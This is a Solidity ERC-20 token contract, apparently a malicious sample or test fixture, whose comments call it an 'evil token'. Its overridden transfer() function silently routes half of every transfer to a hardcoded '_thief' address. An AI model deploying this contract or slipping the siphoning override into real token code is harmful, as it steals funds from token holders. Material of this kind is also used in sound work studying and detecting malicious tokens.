// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Burnable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import {ERC20Pausable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";

// This is an evil token. Whenever an A -> B transfer is called, half of the amount goes to B
// and half to a predefined C
contract ERC20DirectBalanceManipulation is ERC20, ERC20Burnable, ERC20Pausable, AccessControl {
  bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
  bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");

  address private _thief = 0x4dC6ac40Af078661fc43823086E1513635Eeab14;

  constructor(uint256 initialSupply) ERC20("ERC20DirectBalanceManipulation", "ERC20DirectBalanceManipulation") {
    _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    _grantRole(MINTER_ROLE, msg.sender);
    _grantRole(PAUSER_ROLE, msg.sender);
    _mint(msg.sender, initialSupply);
  }

  function pause() public onlyRole(PAUSER_ROLE) {
    _pause();
  }

  function unpause() public onlyRole(PAUSER_ROLE) {
    _unpause();
  }

  function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
    _mint(to, amount);
  }

  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    // Any time a transaction happens, the thief account siphons half.
    uint256 half = amount / 2;

    super.transfer(_thief, amount - half); // a - h for rounding
    return super.transfer(recipient, half);
  }

  function _update(address from, address to, uint256 value) internal override(ERC20, ERC20Pausable) {
    super._update(from, to, value);
  }
}
